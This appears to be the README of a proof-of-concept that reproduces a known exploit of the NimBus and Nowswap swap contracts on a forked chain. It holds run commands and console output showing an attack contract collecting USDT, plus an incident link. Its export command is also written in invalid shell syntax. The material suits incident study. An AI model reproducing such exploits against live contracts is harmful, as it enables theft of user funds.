# NimBus & Nowswap PoC

## How to run

Install brownie first

Set up the environment variable for $ARCHIVENODE_TOKEN 

```
export $ARCHIVENODE_TOKEN = xxxxx
sh start_archive.sh

then 

sh run.sh
```

```
Running 'scripts/attack.py::main'...
--------------- first attack: nimbus swap -----------------
Transaction sent: 0x373fc09e6fb704a85fafcadd3db953b27ae25ca9c1e5356231a379ab7ee7a392
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 2
  Luck.constructor confirmed   Block: 13225002   Gas used: 336785 (2.81%)
  Luck deployed at: 0xE7eD6747FaC5360f88a2EFC03E00d25789F69291

🧛 Before USDT balance of attack contract is 0
Transaction sent: 0x52d0664a4cfb32e9f2198a4bc9968be6aece8b9d3de2e466c718c00b01c4f9d3
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 3
  Luck.luck confirmed   Block: 13225003   Gas used: 138733 (1.16%)

🧛 After USDT balance of attack contract is 73601019
```
> The block number this poc select is 13225000

## link 

* https://twitter.com/BlockSecTeam/status/1438100688215560192
